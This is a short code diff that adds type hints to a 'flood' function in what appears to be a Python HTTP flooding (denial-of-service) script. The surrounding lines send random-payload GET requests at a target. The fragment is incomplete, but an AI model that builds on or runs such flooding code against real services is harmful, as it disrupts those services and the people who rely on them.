@@ -21,7 +21,7 @@ headers = {
 }
 
 # Flood function
-def flood(target):
+def flood(target: str) -> None:
     payload = str(random._urandom(random.randint(10, 150)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
